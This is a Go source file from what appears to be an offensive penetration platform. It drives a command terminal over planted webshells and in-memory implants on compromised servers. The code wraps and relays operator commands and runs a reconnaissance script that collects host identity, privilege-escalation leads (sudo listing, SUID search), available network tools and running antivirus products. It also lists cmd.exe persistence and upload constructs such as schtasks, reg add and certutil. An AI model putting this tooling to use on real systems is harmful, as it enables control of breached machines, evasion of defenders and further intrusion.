package server

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/scanner"
)

// ---------------------------------------------------------------------------
// WebShell 虚拟终端。
//
// 加密 webshell 的每一次请求都是「无状态端点跑一条命令」，目标侧不会替攻击者
// 记住目录，也不会把退出码带回来。蚁剑/菜刀那类工具能 cd、能显示 $?，靠的是在
// 命令前后拼标记、再从回显里拆出来——这套协议平台在内网会话上早就有了
// （intranetScript / parseIntranetOutput，SSH 通道与 webshell 通道共用）。这里把
// 同一个协议接到落地 webshell 与内存马的命令执行上：三条通道一套语义，前端才
// 能用同一个终端组件。
//
// 命令投递抽象成 shellSender（脚本进、原始回显出），与 intranetCommandRunner
// 同样的理由：换通道不必动终端语义，单测也能拿一个本地假 sender 把标记协议跑全。
// ---------------------------------------------------------------------------

const (
	shellExecDefaultTimeout = 30 * time.Second
	shellExecMaxTimeout     = 5 * time.Minute
	// shellExecGrace 留给 web 服务器收尾：目标侧命令跑满超时之后还要编码、还要
	// 写响应，掐得太死会把「拿到了输出」变成「什么都没有」。
	shellExecGrace    = 5 * time.Second
	shellOSProbeTO    = 20 * time.Second
	shellInfoProbeTO  = 60 * time.Second
	shellInfoBodySize = 1 << 20

	// shellInfoSectionLimit caps one probe section. The commands are chosen to
	// stay small; the cap is what keeps a 500-mount `df` or a Windows `set` from
	// turning the info tab into a megabyte of JSON.
	shellInfoSectionLimit = 4000
	// shellInfoSectionMarker separates probe sections inside one script: one
	// round trip per click, not one per question.
	shellInfoSectionMarker = "__JW_SEC__"
)

// shellChannel is one HTTP command endpoint — a landed webshell or an injected
// memory horse — both speaking the same legacy/v2 wire.
type shellChannel struct {
	URL     string
	Payload scanner.ShellPayload
}

// shellSender delivers one already-wrapped script to a target and returns its
// raw echo. The webshell/memory-horse channels build one over
// httpShellSender; an SSH session would build one over intranetSendScript.
type shellSender func(ctx context.Context, script string, timeout time.Duration) (string, error)

// httpShellSender adapts an encrypted HTTP command endpoint to shellSender.
func httpShellSender(ch shellChannel) shellSender {
	return func(ctx context.Context, script string, timeout time.Duration) (string, error) {
		return scanner.RunShellCommand(ctx, scanner.NewDeepClient(timeout), ch.URL, ch.Payload, script)
	}
}

// shellExecResult is one virtual-terminal turn.
type shellExecResult struct {
	Output     string `json:"output"`
	Cwd        string `json:"cwd,omitempty"`
	ExitCode   int    `json:"exit_code"`
	OSKind     string `json:"os_kind,omitempty"`
	Shell      string `json:"shell_kind,omitempty"`
	DurationMS int64  `json:"duration_ms"`
	TimedOut   bool   `json:"timed_out"`
	MarkerOK   bool   `json:"marker_ok"`
	IsError    bool   `json:"is_error"`
	Note       string `json:"note,omitempty"`
}

// shellChannelError words a transport failure for an operator. A deadline means
// "we stopped waiting", not "the target refused": one reads as retry or wait, the
// other reads as give up on this shell, and the raw Go error text ("Post …:
// context deadline exceeded") tells them neither.
func shellChannelError(err error) string {
	if err == nil {
		return ""
	}
	if shellSendDeadline(err) {
		return "等待超时：目标没有在期限内回答，本次操作已停止（载荷上可能仍在执行）"
	}
	return err.Error()
}

// clampShellTimeout bounds the client-supplied timeout so one browser tab
// cannot pin a request goroutine for an hour.
func clampShellTimeout(seconds int) time.Duration {
	if seconds <= 0 {
		return shellExecDefaultTimeout
	}
	max := int(shellExecMaxTimeout / time.Second)
	if seconds > max {
		seconds = max
	}
	return time.Duration(seconds) * time.Second
}

// shellOSKindOf reuses a cached shell family and probes only when there is none.
// confirmed=false means the probe never answered and the returned POSIX is only
// the wrapper we chose to fall back on — callers must not store it as the
// target's family, or a box that was merely unreachable during its first command
// keeps the wrong wrapper forever, and a Windows shell then never gets a cmd
// command line again.
func shellOSKindOf(ctx context.Context, send shellSender, cached string) (kind string, confirmed bool) {
	if cached == intranetOSPosix || cached == intranetOSWindows {
		return cached, true
	}
	pctx, pcancel := context.WithTimeout(ctx, shellOSProbeTO+shellExecGrace)
	defer pcancel()
	raw, err := send(pctx, intranetOSProbe, shellOSProbeTO)
	return classifyOSProbe(raw, err)
}

// shellFamilyOf is shellOSKindOf with the interpreter attached. Passing an empty
// cached shell means "not known yet" — a webshell channel reports only its OS, so
// those callers keep the cmd-or-sh choice the OS alone gives them.
func shellFamilyOf(ctx context.Context, send shellSender, cachedOS, cachedShell string) (osKind, shell string, confirmed bool) {
	if (cachedOS == intranetOSPosix || cachedOS == intranetOSWindows) && intranetShellKnown(cachedShell) {
		return cachedOS, cachedShell, true
	}
	if cachedOS == intranetOSPosix || cachedOS == intranetOSWindows {
		return cachedOS, shellForOS(cachedOS), true
	}
	osKind, shell, confirmed = shellFamilyProbe(ctx, send)
	if confirmed && shellForOS(osKind) != shell {
		// sh/cmd 之外的解释器只能由探测认出来；缓存里若只有 os，别把 cmd 当作默认。
		return osKind, shell, true
	}
	return osKind, shell, confirmed
}

// shellForOS is the interpreter implied by the OS alone, for channels that cannot
// tell us more: Windows means cmd.exe unless someone proved otherwise.
func shellForOS(osKind string) string {
	if osKind == intranetOSWindows {
		return intranetShellCmd
	}
	return intranetShellSh
}

// shellSendDeadline says the transport gave up on its own per-request deadline.
// The HTTP sender cuts off at exactly the command timeout, which is earlier than
// our context (timeout + grace), so a long-running command reaches us as
// "Post …: context deadline exceeded" instead of a cctx expiry. Both readings
// belong to the same event: the operator's wait ended, the target kept working.
func shellSendDeadline(err error) bool {
	var netErr net.Error
	return errors.Is(err, context.DeadlineExceeded) || (errors.As(err, &netErr) && netErr.Timeout())
}

// powershellCmdScriptReason says why a command must not be delivered to a
// PowerShell session: it is one of the platform-generated cmd.exe scripts for
// upload/download/persistence/artifacts that A2 has not ported. An empty string
// means the command is safe to wrap in PowerShell.
//
// Only strong, cmd-only constructs are listed. PowerShell-native commands —
// probes, recon, and operator input with $variables / cmdlets — never match, so
// the virtual terminal keeps working on PowerShell sessions. The full list is
// pinned by TestPowerShellSessionRejectsCmdScriptsWithReason.
func powershellCmdScriptReason(command string) string {
	for _, marker := range []string{
		"if exist ", "if not exist ", // 上传存在性探测、落地物验证
		"certutil -",             // 上传解码 / 下载编码
		"del /f /q ", "move /y ", // 临时文件清理 / 覆盖
		"for %I in (", "@echo %~", // 下载文件大小探测
		"schtasks /create", "schtasks /delete", "schtasks /query",
		"reg add ", "reg delete ", "reg query ",
		"sc create ", "sc stop ", "sc delete ", "sc query ",
		"cmd /c exit 0", ">nul 2>&1", // 台账撤销/验证的退出码归零
		"-EncodedCommand ", "-NoProfile -NonInteractive -Command", // 经 cmd 调 powershell.exe
	} {
		if strings.Contains(command, marker) {
			return powershellCmdRejectReason(marker)
		}
	}
	if isCmdBase64Append(command) {
		return powershellCmdRejectReason("echo <base64>>> 分块写入")
	}
	return ""
}

func powershellCmdRejectReason(marker string) string {
	return "PowerShell 会话拒绝执行 cmd.exe 语法脚本（命中 " + marker + "）：" +
		"上传/下载/权限维持/落地物脚本尚未移植为 PowerShell，已停止投递，未静默成功；" +
		"请改用 cmd.exe 会话，或等待该模块移植"
}

// isCmdBase64Append matches the platform's chunked upload writer
// `echo <40+ base64 chars>>>C:\path.b64`. An operator's `echo ... > file` in a
// PowerShell terminal essentially never looks like this, while every upload
// chunk is still caught — the guard must not let a chunk slip through after the
// first `if exist` probe was already rejected.
func isCmdBase64Append(command string) bool {
	if !strings.HasPrefix(command, "echo ") {
		return false
	}
	i := strings.Index(command, ">>")
	if i < 0 {
		return false
	}
	body := strings.TrimSpace(command[len("echo "):i])
	if len(body) < 40 {
		return false
	}
	for _, r := range body {
		if !(r >= 'A' && r <= 'Z' || r >= 'a' && r <= 'z' ||
			r >= '0' && r <= '9' || r == '+' || r == '/' || r == '=') {
			return false
		}
	}
	return strings.Contains(command[i+2:], `:\`)
}

// shellExec runs one command on any channel and splits the cwd/exit-code
// trailer back out of the echo, so callers get terminal semantics rather than a
// bare string. osKind is the cached family ("" = never probed) and the resolved
// one comes back on the result for the caller to store where it belongs:
// webshells.os_kind for a landed shell, session metadata for an intranet one.
func shellExec(ctx context.Context, send shellSender, cwd, osKind, shellKind, command string, timeout time.Duration) shellExecResult {
	res := shellExecResult{ExitCode: -1, OSKind: osKind, Shell: shellKind}
	if strings.TrimSpace(command) == "" {
		res.IsError, res.Note = true, "命令不能为空"
		return res
	}
	if timeout <= 0 {
		timeout = shellExecDefaultTimeout
	}
	kind, shell, confirmed := shellFamilyOf(ctx, send, osKind, shellKind)
	// The wrapper we run with and the family we report are different claims: an
	// unprobed target still executes as POSIX, but reporting that would let the
	// caller file a guess away as the target's operating system.
	if confirmed {
		res.OSKind, res.Shell = kind, shell
	}
	// A2 遗留：上传/下载/权限维持/落地物的脚本仍是 cmd.exe 语法。把它们塞进
	// PowerShell 包装，真实目标只会解析失败，而进程内靶机（只看包装标记）会
	// 假装成功——两种都比点名拒绝糟。这里在投递前拦下，绝不静默成功。
	if confirmed && shell == intranetShellPowerShell {
		if reason := powershellCmdScriptReason(command); reason != "" {
			// 下载/上传的下游会把 outcome.Note 改写成泛化文案；日志保证点名原因
			// 仍留在服务端，操作员不会只看到「无法读取文件大小」这种无从复核的话。
			log.Printf("shellExec: %s", reason)
			res.IsError = true
			res.Output, res.Note = reason, reason
			return res
		}
	}
	// An operator's first command should report where the web server actually put
	// the process — the script directory — not the filesystem root. "cd ." leaves
	// $PWD alone and still falls back to / when even that fails; the cmd.exe
	// wrapper already skips the cd when cwd is empty.
	startCwd := strings.TrimSpace(cwd)
	if startCwd == "" && kind != intranetOSWindows {
		startCwd = "."
	}
	script := shellWrapper(kind, shell, startCwd, command)
	cctx, cancel := context.WithTimeout(ctx, timeout+shellExecGrace)
	defer cancel()
	start := time.Now()
	raw, err := send(cctx, script, timeout)
	res.DurationMS = time.Since(start).Milliseconds()
	if err != nil {
		res.Output, res.IsError = raw, true
		switch {
		case errors.Is(cctx.Err(), context.DeadlineExceeded) || shellSendDeadline(err):
			// Only our wait ended; the command is very likely still running on
			// the target. Saying so is the difference between "this shell is
			// broken" and "that command never returns" — the operator has to
			// pick which one to act on.
			res.TimedOut = true
			res.Note = fmt.Sprintf("等待 %s 未返回，已停止等待：目标上的命令可能仍在继续执行", timeout)
		case errors.Is(cctx.Err(), context.Canceled):
			res.Note = "请求已取消，目标上的命令可能仍在执行"
		default:
			res.Note = err.Error()
		}
		return res
	}
	out, newCwd, code, ok := parseIntranetOutput(raw)
	res.MarkerOK = ok
	if !ok {
		res.Output, res.IsError = raw, true
		res.Note = "未解析到命令结束标记：目标可能不是预期的 shell 类型，或命令中断了执行"
		return res
	}
	res.Output, res.ExitCode = out, code
	res.IsError = code > 0
	// A relative or drive-less cwd cannot be restored next turn, so it is
	// dropped instead of stored: the following command would cd somewhere
	// unexpected and the operator would read output from the wrong directory.
	if intranetAbsCwd(kind, newCwd) {
		res.Cwd = newCwd
	}
	return res
}

type shellInfoProbe struct {
	Label   string
	Posix   string
	Windows string // empty means the section is skipped on cmd.exe
}

// shellInfoProbes is the 系统信息 tab: what an operator asks of a box in the
// first five minutes after landing. One script, because every section would
// otherwise be a separate encrypted request.
var shellInfoProbes = []shellInfoProbe{
	{Label: "主机与系统",
		Posix:   `hostname; uname -a; cat /etc/os-release 2>/dev/null | head -n 6`,
		Windows: `echo %COMPUTERNAME% & ver`},
	{Label: "运行身份",
		Posix:   `id; echo "HOME=$HOME"; echo "SHELL=$SHELL"`,
		Windows: `whoami & whoami /priv 2>nul`},
	{Label: "时间与运行时长",
		Posix:   `date; uptime`,
		Windows: `echo %date% %time%`},
	{Label: "网络接口与路由",
		Posix:   `ip -o addr show 2>/dev/null || ifconfig -a 2>/dev/null; ip route 2>/dev/null; head -n 8 /etc/resolv.conf 2>/dev/null`,
		Windows: `ipconfig`},
	{Label: "CPU",
		Posix:   `nproc 2>/dev/null; grep -m1 'model name' /proc/cpuinfo 2>/dev/null; uname -m`,
		Windows: `echo %NUMBER_OF_PROCESSORS% %PROCESSOR_ARCHITECTURE% %PROCESSOR_IDENTIFIER%`},
	{Label: "内存",
		Posix:   `free -m 2>/dev/null | head -n 3; grep -m2 Mem /proc/meminfo 2>/dev/null`,
		Windows: `wmic ComputerSystem get TotalPhysicalMemory 2>nul`},
	{Label: "磁盘与挂载",
		Posix:   `df -h 2>/dev/null | head -n 12; mount 2>/dev/null | head -n 8`,
		Windows: `wmic logicaldisk get caption,size,freespace 2>nul`},
	{Label: "当前目录",
		Posix:   `pwd; ls -ld .; ls -l 2>/dev/null | head -n 20`,
		Windows: `cd & dir`},
	{Label: "提权线索",
		// -xdev matters: every section shares this one request and one 60s
		// budget, and a root walk that crosses into a mounted drive (on the lab
		// host, /mnt/c) ran for minutes and took the whole 系统信息 panel down.
		Posix:   `sudo -n -l 2>&1 | head -n 12; ls -l /etc/sudoers 2>/dev/null; cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null; find / -xdev -perm -4000 -type f 2>/dev/null | head -n 20`,
		Windows: `net localgroup administrators 2>nul`},
	{Label: "可用工具",
		Posix:   `for b in bash sh python3 python perl php curl wget nc ncat socat ssh git gcc make crontab systemctl docker; do command -v "$b" >/dev/null 2>&1 && printf '%s ' "$b"; done; echo`,
		Windows: `where curl 2>nul & where powershell 2>nul & where certutil 2>nul & where bitsadmin 2>nul & where wmic 2>nul & where msbuild 2>nul`},
	{Label: "Web 服务与进程",
		Posix:   `ps aux 2>/dev/null | grep -Ei 'apach|nginx|java|tomcat|php|mysql|redis' | grep -v grep | head -n 10`,
		Windows: `tasklist /nh 2>nul | findstr /i "360 Huor Dfw Kxe Avast AVG Kav java php httpd nginx Tomcat w3svc mysqld"`},
	{Label: "环境变量",
		Posix:   `env | sort | head -n 40`,
		Windows: `set`},
}

// shellInfoScript renders the probe set for one shell family.
func shellInfoScript(osKind string) string {
	windows := osKind == intranetOSWindows
	parts := []string{}
	for _, p := range shellInfoProbes {
		cmd := p.Posix
		if windows {
			if strings.TrimSpace(p.Windows) == "" {
				continue
			}
			cmd = p.Windows
		}
		if windows {
			parts = append(parts, "echo "+shellInfoSectionMarker+p.Label+" & ("+cmd+")")
			continue
		}
		parts = append(parts, "echo "+shellInfoSectionMarker+p.Label+"\n"+cmd)
	}
	if len(parts) == 0 {
		return "echo 无可用的信息收集项"
	}
	sep := "\n"
	if windows {
		sep = " & "
	}
	return strings.Join(parts, sep)
}

// shellInfoSection is one labelled block of the system information panel.
type shellInfoSection struct {
	Label  string `json:"label"`
	Output string `json:"output"`
}

// parseShellInfoSections splits the probe echo back into labelled sections.
// Text before the first marker is dropped: that is the wrapper's own noise, not
// an answer to any question that was asked.
func parseShellInfoSections(raw string) []shellInfoSection {
	lines := strings.Split(strings.ReplaceAll(raw, "\r\n", "\n"), "\n")
	out := []shellInfoSection{}
	for _, line := range lines {
		if t := strings.TrimSpace(line); strings.HasPrefix(t, shellInfoSectionMarker) {
			out = append(out, shellInfoSection{
				Label: strings.TrimSpace(strings.TrimPrefix(t, shellInfoSectionMarker)),
			})
			continue
		}
		if len(out) == 0 {
			continue
		}
		out[len(out)-1].Output += line + "\n"
	}
	for i := range out {
		out[i].Output = truncateIntranetOutput(strings.TrimRight(out[i].Output, "\n"), shellInfoSectionLimit)
	}
	return out
}

// resolveWebshellChannel loads a managed webshell and rebuilds its payload,
// applying the guards every shell call needs. Unlike webshellFileTarget it
// accepts legacy shells: running a command does not need the v2 key, only the
// file-management protocol does.
func (s *Server) resolveWebshellChannel(w http.ResponseWriter, r *http.Request) (*db.DB, *db.Webshell, shellChannel, bool) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的 webshell ID")
		return nil, nil, shellChannel{}, false
	}
	pg := s.pg(w)
	if pg == nil {
		return nil, nil, shellChannel{}, false
	}
	shell, err := pg.GetWebshell(id)
	if err != nil {
		writeErr(w, 404, "webshell 不存在")
		return nil, nil, shellChannel{}, false
	}
	if strings.TrimSpace(shell.URL) == "" {
		writeErr(w, 400, "该 webshell 没有可用地址")
		return nil, nil, shellChannel{}, false
	}
	if reason, allowed := shellAllowed(pg, shell.URL); !allowed {
		writeErr(w, 400, "webshell 地址命中资产拦截规则，已拒绝："+reason)
		return nil, nil, shellChannel{}, false
	}
	payload, err := s.shellPayloadFor(shell)
	if err != nil {
		writeErr(w, 400, err.Error())
		return nil, nil, shellChannel{}, false
	}
	return pg, shell, shellChannel{URL: shell.URL, Payload: payload}, true
}

// execWebshellCommand runs one command through a webshell and returns terminal
// semantics: the directory the command ended in, its exit code, how long it
// took, and whether the wait was abandoned.
func (s *Server) execWebshellCommand(w http.ResponseWriter, r *http.Request) {
	pg, shell, ch, ok := s.resolveWebshellChannel(w, r)
	if !ok {
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, shellInfoBodySize)
	var req struct {
		Command        string `json:"command"`
		Cwd            string `json:"cwd"`
		OSKind         string `json:"os_kind"`
		TimeoutSeconds int    `json:"timeout_seconds"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	// The directory belongs to this terminal, not to the shell record: the
	// caller echoes back what the last command reported. An empty cwd makes the
	// wrapper cd to /, same as a fresh login. A webshell that also carries an
	// intranet session has that session's own cwd, and the two are allowed to
	// differ for the same reason two SSH logins to one host may.
	cwd := strings.TrimSpace(req.Cwd)
	// The operator can override the shell family from the terminal, which is the
	// only way out of a target that never answers the probe: without it a wrong
	// guess would keep the POSIX wrapper on a cmd box forever with nothing to click.
	// An override is a decision, so it both runs and gets filed.
	kind := shell.OSKind
	if k := strings.TrimSpace(req.OSKind); k == intranetOSPosix || k == intranetOSWindows {
		kind = k
	}
	res := shellExec(r.Context(), httpShellSender(ch), cwd, kind, "", req.Command, clampShellTimeout(req.TimeoutSeconds))
	if res.Output == "" && res.Note != "" {
		res.Output = res.Note
	}
	status := "alive"
	if res.TimedOut {
		// A shell that stopped answering inside the deadline is neither proven
		// dead nor proven alive; "unknown" keeps the ledger honest both ways.
		status = "unknown"
	}
	if err := pg.UpdateWebshellTerminal(shell.ID, res.OSKind, status, truncateText(res.Output, 8000)); err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	writeJSON(w, 200, res)
}

// webshellInfo collects the system information panel in one probe script, then
// merges the PHP runtime self-report for shells that implement the v2 I op.
func (s *Server) webshellInfo(w http.ResponseWriter, r *http.Request) {
	pg, shell, ch, ok := s.resolveWebshellChannel(w, r)
	if !ok {
		return
	}
	// Same rule as exec: the terminal's directory comes from the caller and is
	// reported back, never stored on the shell record.
	cwd := strings.TrimSpace(r.URL.Query().Get("cwd"))
	res := shellExec(r.Context(), httpShellSender(ch), cwd, shell.OSKind, "", shellInfoScript(shell.OSKind), shellInfoProbeTO)
	if res.Cwd != "" {
		cwd = res.Cwd
	}
	infoStatus := "alive"
	if res.TimedOut {
		infoStatus = "unknown"
	}
	_ = pg.UpdateWebshellTerminal(shell.ID, res.OSKind, infoStatus, "")

	// The I op answers what no shell command can: what the interpreter itself is
	// willing to say (disable_functions, open_basedir, prepend config).
	var runtime *scanner.ShellInfo
	runtimeNote := ""
	if !strings.EqualFold(shell.ShellType, "php") || !strings.EqualFold(shell.Protocol, scanner.ShellProtocolV2) {
		// JSP/ASPX and legacy shells implement no I op. A note is the difference
		// between an empty 运行时 block that reads as "not supported" and one that
		// reads as "collection failed here".
		runtimeNote = "解释器自述（php.ini、open_basedir、disable_functions）只有 PHP v2 壳能回答"
	} else {
		ictx, cancel := context.WithTimeout(r.Context(), shellOSProbeTO)
		defer cancel()
		info, err := scanner.QueryShellInfo(ictx, scanner.NewDeepClient(shellOSProbeTO), ch.URL, ch.Payload)
		switch {
		case err != nil:
			runtimeNote = shellChannelError(err)
		default:
			runtime = &info
			if strings.TrimSpace(cwd) == "" {
				cwd = info.Dir
			}
			if runtime.Windows() && res.OSKind != intranetOSWindows {
				runtimeNote = "PHP 运行时报告的是 Windows，但命令通道按 POSIX 执行：目标上的 shell 类型可能与登记不一致"
			}
		}
	}

	writeJSON(w, 200, map[string]any{
		"shell_id":     shell.ID,
		"os_kind":      res.OSKind,
		"cwd":          cwd,
		"sections":     parseShellInfoSections(res.Output),
		"runtime":      runtime,
		"runtime_note": runtimeNote,
		"duration_ms":  res.DurationMS,
		"marker_ok":    res.MarkerOK,
		"note":         res.Note,
	})
}
